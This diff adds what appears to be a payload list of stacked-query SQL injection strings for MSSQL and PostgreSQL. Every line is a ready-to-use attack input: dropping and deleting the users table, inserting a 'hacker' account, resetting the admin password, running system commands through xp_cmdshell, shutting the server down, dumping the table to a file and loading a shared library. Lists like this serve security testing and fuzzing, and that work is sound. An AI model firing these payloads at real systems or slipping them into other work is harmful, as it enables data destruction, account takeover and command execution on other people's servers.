@@ -1,0 +1,21 @@
+# SQL Injection - Stacked Queries
+# Multi-statement payloads that attempt to execute additional queries
+# Works on MSSQL, PostgreSQL; sometimes MySQL with multi_query
+'; DROP TABLE users--
+'; DROP TABLE users#
+'; SELECT * FROM users--
+'; SELECT * FROM users#
+1; SELECT * FROM users--
+'; INSERT INTO users(username,password) VALUES('hacker','hacked')--
+'; UPDATE users SET password='hacked' WHERE username='admin'--
+'; DELETE FROM users WHERE 1=1--
+'; CREATE TABLE evil(data text)--
+'; EXEC xp_cmdshell('dir')--
+'; EXEC xp_cmdshell('whoami')--
+'; EXEC sp_makewebtask '/tmp/out.html','SELECT * FROM users'--
+'; SHUTDOWN--
+1; SELECT 1
+'; SELECT pg_sleep(5)--
+'; COPY users TO '/tmp/users.csv' CSV--
+'; SELECT * FROM information_schema.tables--
+'; SELECT load_extension('/tmp/evil.so')--
